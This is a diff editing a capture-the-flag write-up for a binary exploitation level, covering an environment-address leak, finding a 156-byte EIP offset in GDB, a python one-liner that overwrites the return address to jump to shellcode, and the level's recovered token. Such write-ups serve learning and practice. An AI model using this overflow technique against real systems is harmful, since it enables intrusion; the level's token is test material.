@@ -33,15 +33,15 @@
      && gcc -O2 -m32 /tmp/_tmp.c -o /tmp/_tmp \
      && /tmp/_tmp \
      && rm -f /tmp/_tmp /tmp/_tmp.c
-   # example output on the author\'s system:
+   # output :
    0xffffd8b8
    ```
 
-   Example leaked address: **`0xffffd8b8`** (in the environment area).
+   leaked address: **`0xffffd8b8`** (in the environment area).
 
 5. Finding the overflow offset (under GDB)
 
-   Use a cyclic pattern for the crashing input. The program crashes with EIP = `0x41326641`, from which the EIP overwrite **offset = 156** bytes was determined.
+   Use a cyclic pattern ([wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)) for the crashing input. The program crashes with EIP = `0x41326641`, from which the EIP overwrite **offset = 156** bytes was determined.
 
    ```bash
    (gdb) set follow-fork-mode child
@@ -68,19 +68,6 @@
    python -c "print('A'*156 + '\xb8\xd8\xff\xff')" | ./level04
    ```
 
-   Example run (author):
-
-   ```
-   Give me some shellcode, k
-   3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
-   ```
-
-7. Notes & caveats
-
-   * **ASLR**: If enabled, the environment address may vary across runs. The technique assumes a stable env layout; otherwise disable ASLR or obtain a fresh leak each run.
-   * **Architecture**: Keep consistency between the helper and the target (use `-m32` as shown); pack addresses as **little‑endian**.
-   * **Reliability**: If the jump is flaky, add a small **NOP sled** in the environment payload before the shellcode bytes and land anywhere within it.
-
-8. Token discovered
+7. Token discovered
 
    Token `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`
